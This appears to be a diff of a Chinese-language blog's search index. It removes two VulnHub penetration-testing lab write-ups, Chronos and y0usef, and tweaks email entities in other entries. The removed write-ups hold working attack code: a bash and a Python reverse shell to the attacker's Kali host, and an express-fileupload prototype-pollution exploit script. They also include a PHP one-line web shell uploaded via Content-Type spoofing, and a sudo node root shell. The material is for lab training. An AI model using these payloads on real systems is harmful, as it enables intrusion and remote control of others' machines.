-<h3 id="0x02-生成反弹-shell"><a href="#0x02-生成反弹-shell" class="headerlink" title="0x02. 生成反弹 shell"></a>0x02. 生成反弹 shell</h3><ol>
-<li><p>利用上述指令出入漏洞查看靶机 <code>/usr/bin</code> 下的文件，注入步骤同上：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021140646383.png" width=350 />
-</div>
-
-
-<p>发现存在 python 环境，故尝试利用此前多次使用的 python 反弹 shell 代码生成反弹 shell。</p>
-</li>
-<li><p>在 kali 监听 4444 端口，将反弹 shell 命令编码后注入：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021141046767.png" width=550 />
-</div>
-
-
-<p>成功获取到来自靶机的反弹 shell。</p>
-</li>
-<li><p>通过一下命令进行提升：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
-
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021141422079.png" width=550 />
-</div></li>
-</ol>
-<h3 id="0x03-node-js-express-fileupload-漏洞"><a href="#0x03-node-js-express-fileupload-漏洞" class="headerlink" title="0x03. node.js express-fileupload 漏洞"></a>0x03. node.js express-fileupload 漏洞</h3><ol>
-<li><p>通过简单的信息收集，我们在 <code>/opt/chronos-v2/backend</code> 路径下找到了与 <code>node.js</code> 服务相关的文件 <code>server.js</code>：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021142250813.png" width=550 />
-</div>
-
-
-<p>查看其内容：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&quot;express-fileupload&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileupload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&quot;/opt/chronos-v2/frontend/pages&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title class_">Server</span>(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.<span class="title function_">listen</span>(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>发现该代码在运行时会在本地 IP 的 8080 端口上运行一个 web 服务器。同时还发现该应用加载了 <code>express-fileupload</code> 库。通过搜索，发现若设置了 <code>app.use(fileupload(&#123; parseNested: true &#125;));</code> ，则存在可以用的漏洞。再次查看上述代码，发现恰好启用了该服务。</p>
-</li>
-<li><p>继续搜索有关内容，最终在一篇<a href="https://blog.p6.is/Real-World-JS-1/">博客文章</a>中找到可用的漏洞利用代码，并根据实验环境进行修改：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.0.2.15 为靶机的IP</span></span><br><span class="line"><span class="comment"># 5555 为靶机监听的端口</span></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.0.2.15/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://127.0.0.1:8080 为本次实验中目标服务的访问地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>先将该段代码写入位于 kali 的某一文件中，再通过之前实验中的方式，利用在 kali 上启动 web 服务的方式将该文件上传至靶机（通过之前的步骤我们得知靶机中存在 python 环境）</p>
-<p><a id="要链接！！！"></a></p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021144921540.png" width=350 />
-</div>
-</li>
-<li><p>执行：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 code.py</span><br></pre></td></tr></table></figure>
-
-<p>获取到另一个用户身份的反弹shell：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/@IFF6W$S]HAT[XN09[_}XU.png" width=700 />
-</div></li>
-</ol>
-<h3 id="0x04-第一个-Flag"><a href="#0x04-第一个-Flag" class="headerlink" title="0x04. 第一个 Flag"></a>0x04. 第一个 Flag</h3><ol>
-<li><p>切换至当前用户的主目录 <code>/home/imera</code>，发现文件 <code>user.txt</code>。查看内容：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021151014936.png" width=400 />
-</div>
-</li>
-<li><p>使用 base58 解码后，得到：</p>
-<p><code>Char &#39;I&#39; at position 12 not in alphabet</code></p>
-</li>
-</ol>
-<h3 id="0x05-利用-node-命令提权"><a href="#0x05-利用-node-命令提权" class="headerlink" title="0x05. 利用 node 命令提权"></a>0x05. 利用 node 命令提权</h3><ol>
-<li><p>查看当前用户可以通过 <code>sudo</code> 执行的命令：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021151621621.png" width=700 />
-</div>
-
-
-<p>发现存在两个命令可以不提供密码直接使用 <code>sudo</code> 执行。</p>
-</li>
-<li><p>输入以下命令：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo node -e <span class="string">&#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>生成一个拥有 root 权限的 shell 进行提权：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021151917440.png" width=700 />
-</div></li>
-</ol>
-<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><p>Flag1：<code>Char &#39;I&#39; at position 12 not in alphabet</code></p>
-<p>root 提权：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021151917440.png" width=700 />
-</div>
-
-
-
-
-<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
-<li>访问靶机80端口，查看源码发现存在对域名地址 <code>chronos.local</code> 的访问；</li>
-<li>修改 kali 的 <code>/etc/hosts</code> 文件，将上述域名与靶机 IP 绑定；</li>
-<li>利用  <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 进行数据的编解码；</li>
-<li>拦截访问靶机80端口时，向 <code>http://chronos.local:8000</code> 发送的数据包，利用命令注入漏洞注入编码后的反弹 shell 指令；</li>
-<li>利用反弹 shell 进行信息收集，对文件  <code>/opt/chronos-v2/backend/server.js</code> 进行代码审计，发现隐藏的本地服务器；</li>
-<li>上网搜索相关的漏洞信息，发现漏洞利用代码；</li>
-<li>将代码文件上传至靶机并执行，得到另一个用户身份的反弹 shell；</li>
-<li>利用 node 命令进行本地提权。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>网络攻防实战</category>
-      </categories>
-      <tags>
-        <tag>学习</tag>
-        <tag>Kali</tag>
-        <tag>网络</tag>
-        <tag>安全</tag>
-        <tag>Linux</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【渗透测试】第七周 vulnhub-Fawkes</title>
     <url>/vulnhub-Fawkes/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
 <p>网络攻防实战 第七次实验</p>
-<p>邮箱：<a href="mailto:&#x6b;&#101;&#101;&#x6b;&#107;&#x65;&#x77;&#121;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#x6b;&#101;&#101;&#x6b;&#107;&#x65;&#x77;&#121;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+<p>邮箱：<a href="mailto:&#x6b;&#x65;&#x65;&#107;&#107;&#101;&#x77;&#x79;&#x40;&#x71;&#x71;&#x2e;&#x63;&#111;&#109;">&#x6b;&#x65;&#x65;&#107;&#107;&#101;&#x77;&#x79;&#x40;&#x71;&#x71;&#x2e;&#x63;&#111;&#109;</a></p>
 <p>2022年11月2日</p>
 <p>靶机连接：<a href="https://vulnhub.com/entry/harrypotter-fawkes,686/">https://vulnhub.com/entry/harrypotter-fawkes,686/</a></p>
 </blockquote>
@@ -2818,217 +2832,11 @@
       </tags>
   </entry>
   <entry>
-    <title>【渗透测试】第一周 vulnhub-y0usef</title>
-    <url>/vulnhub-y0usef/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
-<p>第一周</p>
-<p>可弟WZ</p>
-<p>主页：blog.kekwy.com</p>
-<p>邮箱：<a href="mailto:&#107;&#101;&#x65;&#107;&#x6b;&#x65;&#x77;&#121;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;">&#107;&#101;&#x65;&#107;&#x6b;&#x65;&#x77;&#121;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;</a></p>
-<p>2022年9月27日</p>
-</blockquote>
-<h2 id="一、实验准备"><a href="#一、实验准备" class="headerlink" title="一、实验准备"></a>一、实验准备</h2><p>靶机：y0usef</p>
-<p>下载链接：<a href="https://www.vulnhub.com/entry/y0usef-1,624/">https://www.vulnhub.com/entry/y0usef-1,624/</a></p>
-<p>攻击机：kali</p>
-<h2 id="二、实验目标"><a href="#二、实验目标" class="headerlink" title="二、实验目标"></a>二、实验目标</h2><p>取得目标靶机的root权限和2个flag。</p>
-<h2 id="三、实验内容"><a href="#三、实验内容" class="headerlink" title="三、实验内容"></a>三、实验内容</h2><ol>
-<li><p>在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。</p>
-</li>
-<li><p>在kali中执行以下指令进行局域网主机发现：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br></pre></td></tr></table></figure>
-
-<p>扫描结果如下：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921103912013.png" alt="image-20220921103912013"> </p>
-<p>可以推断<sup>1</sup>出靶机 地址为 <code>10.0.2.5</code> 。</p>
-<p><a id="jump1"></a></p>
-<p><code>1：</code> 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。</p>
-</li>
-<li><p>在kali中执行以下指令扫描靶机的端口状态：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.5</span></span><br></pre></td></tr></table></figure>
-
-<p>扫描结果如下：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921083225282.png" alt="image-20220921083225282"> </p>
-<p>发现开通了22、80两个端口，提示我们可以考虑靶机上的<code>ssh</code>与<code>http</code>服务。为了进一步确定各端口的用途，我们可以通过以下指令<sup>2</sup>获取对应的服务版本信息：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p22,80 -sV -sC 10.0.2.5</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><a id="jump2"></a></p>
-<p><code>2:</code> <code>-p</code> 对指定端口扫描</p>
-<p>​	    <code>-sV -sC</code> 默认安全脚本扫描</p>
-<p>扫描结果如下：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111148084.png" alt="image-20220921111148084"> </p>
-</li>
-<li><p>我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111747118.png" alt="image-20220921111747118"> </p>
-<p> 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的<code>robots.txt</code>文件<sup>3</sup>：</p>
-<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921112049063.png" alt="image-20220921112049063" style="zoom:67%;" /> 
-
-<p>但令人遗憾的是，我们并不能查看该文件。</p>
-<p><a id="jump3"></a></p>
-<p><code>3:</code> Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。</p>
-</li>
-<li><p>使用whatweb工具查看web应用所采用的软件构架：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ whatweb http://10.0.2.5</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921151941056.png" alt="image-20220921151941056"> </p>
-<p>尝试使用工具<code>dirsearch</code>爆破 web 服务端的路径，发现一些隐藏的路径和文件：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dirsearch -u http://10.0.2.5</span></span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921091507301.png" alt="image-20220921091507301" style="zoom: 50%;" /> 
-
-<p>得知<sup>4</sup>服务器上有三个我们可以访问的文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/adminstration</span><br><span class="line">/index.php</span><br><span class="line">/index.php/login</span><br></pre></td></tr></table></figure>
-
-<p>其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。</p>
-<p><a id="jump4"></a></p>
-<p><code>4:</code> HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。</p>
-<p>上述结果中出现的状态码的含义分别为：</p>
-<table>
-<thead>
-<tr>
-<th>状态码</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>403</td>
-<td>(禁止)服务器拒绝请求。</td>
-</tr>
-<tr>
-<td>301</td>
-<td>(永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。</td>
-</tr>
-<tr>
-<td>200</td>
-<td>(成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>访问<code>10.0.2.5/adminstration</code>：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921114137208.png" alt="image-20220921114137208"> </p>
-<p>提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式：</p>
-<p>启动Burp Suit并启用拦截，将浏览器代理设置为<code>127.0.0.1:8080</code>（Burp Suit的默认代理端口为8080）。</p>
-<p>刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入<code>X-Forwarded-For: 127.0.0.1</code><sup>5</sup>（如下图），再将其发送。<em><strong>【后续被拦截的数据包都需要插入上述内容。】</strong></em></p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124711969.png" alt="image-20220921124711969"> </p>
-<p>发现成功进入一个登录界面：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124805448.png" alt="image-20220921124805448"> </p>
-<p>这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130249392.png" alt="image-20220921130249392">  </p>
-<p><a id="jump5"></a></p>
-<p><code>5</code>: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。</p>
-</li>
-<li><p>简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。</p>
-<p>首先编写一个“一句话木马”的PHP 文件<code>shell.php</code>，内容如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$var</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="keyword">echo</span> <span class="variable">$var</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>尝试直接将其上传，发现网站提示文件被拒绝：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130902640.png" alt="image-20220921130902640"> </p>
-<p>推测网站可能存在针对文件类型的过滤<sup>6</sup>，我们可以通过修改被拦截的报文中<code>Content-Type</code>字段的值进行绕过：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131442789.png" alt="image-20220921131442789"> </p>
-<p>修改为：<code>image/png</code>：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131518489.png" alt="image-20220921131518489"> </p>
-<p>文件上传成功了，并提供了上传完成的文件的URL。</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131734558.png" alt="image-20220921131734558"> </p>
-<p><a id="jump6"></a></p>
-<p><code>6:</code> 常见的过滤形式与绕过方法：</p>
-<ol>
-<li>针对文件扩展名的绕过：</li>
-</ol>
-<p>修改文件扩展名后，再上传。</p>
-<p>2)针对文件类型的绕过：</p>
-<p>修改报文中的<code>Content-Type</code>字段（如本次实验）。</p>
-<p>3)针对文件内容的绕过：</p>
-<p>在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。</p>
-</li>
-<li><p>通过URL访问文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php</span><br></pre></td></tr></table></figure>
-
-<p>进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921133834453.png" alt="image-20220921133834453"> </p>
-<p>指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python</span><br></pre></td></tr></table></figure>
-
-<p>得到了靶机上的python路径，说明靶机有python环境：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921134349689.png" alt="image-20220921134349689"> </p>
-<p>故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc -nvlp 4444</span><br></pre></td></tr></table></figure>
-
-<p>修改对应的python代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444.</p>
-<p>将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell：</p>
-<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140145500.png" alt="image-20220921140145500" style="zoom:67%;" /> 
-
-<p>使用以下指令对反弹shell进行一个简单的升级: </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140419911.png" alt="image-20220921140419911"> </p>
-</li>
-<li><p>查看&#x2F;etc&#x2F;passwd 文件<sup>7</sup>：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd</span></span><br></pre></td></tr></table></figure>
-
-<p>注意到有以下一项：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>说明有一个叫<code>yousef</code>的用户可以登录系统<sup>8</sup>，且主目录为<code>/home/yousef</code>。</p>
-<p>进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。</p>
-<p><a id="jump7"></a></p>
-<p><code>7</code>: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell</span><br></pre></td></tr></table></figure>
-
-<p><a id="jump8"></a></p>
-<p><code>8</code>: 对于用户的登录shell：</p>
-<p><code>/bin/false</code> 是最严格的禁止login选项，一切服务都不能用，</p>
-<p><code>/bin/nologin</code> 只是不允许系统login，可以使用其他ftp等服务</p>
-<p>因此我们一眼就锁定了<code>yousef</code>用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。</p>
-</li>
-<li><p>第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。</p>
-<p>退出反弹shell，在kali的shell使用以下指令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh yousef@10.0.2.5</span></span><br></pre></td></tr></table></figure>
-
-<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142200653.png" alt="image-20220921142200653" style="zoom:67%;" /> 
-
-<p> 成功登入yousef后，查看该用户所在的用户组：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142413525.png" alt="image-20220921142413525"> </p>
-<p>发现该用户属于sudo组，查看该用户可执行的指令：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142645249.png" alt="image-20220921142645249"> </p>
-<p>发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo -i</span></span><br></pre></td></tr></table></figure>
-
-<p>查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。</p>
-</li>
-<li><p>至此我们实现了root权限的提取，并成功获取了所有的两个flag。</p>
-</li>
-</ol>
-<p>【完结撒花】</p>
-]]></content>
-      <categories>
-        <category>网络攻防实战</category>
-      </categories>
-      <tags>
-        <tag>学习</tag>
-        <tag>Kali</tag>
-        <tag>网络</tag>
-        <tag>安全</tag>
-        <tag>Linux</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【渗透测试】第九周 vulnhub-DoubleTrouble:1</title>
     <url>/vulnhub-doubletrouble/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
 <p>网络攻防实战 第九次实验</p>
-<p>邮箱：<a href="mailto:&#x6b;&#101;&#x65;&#107;&#107;&#101;&#119;&#121;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#x6b;&#101;&#x65;&#107;&#107;&#101;&#119;&#121;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;</a></p>
+<p>邮箱：<a href="mailto:&#107;&#101;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#64;&#x71;&#113;&#x2e;&#x63;&#111;&#109;">&#107;&#101;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#64;&#x71;&#113;&#x2e;&#x63;&#111;&#109;</a></p>
 <p>靶机链接：<a href="https://www.vulnhub.com/entry/doubletrouble-1,743/">https://www.vulnhub.com/entry/doubletrouble-1,743/</a></p>
 <p>2022年11月15日</p>
 </blockquote>
@@ -3271,6 +3079,212 @@
 <li>浏览器访问 80 端口，发现登录界面。通过 <code>sqlmap</code> 进行 <code>sql</code> 注入，获取用户名和密码，通过 SSH 登入。</li>
 <li>查看靶机内核，发现存在脏牛漏洞，搜索利用代码，上传至靶机编译运行，发现强制修改了 root 用户的密码，使用该密码即可至 root 身份，提权成功。</li>
 </ul>
+]]></content>
+      <categories>
+        <category>网络攻防实战</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>Kali</tag>
+        <tag>网络</tag>
+        <tag>安全</tag>
+        <tag>Linux</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
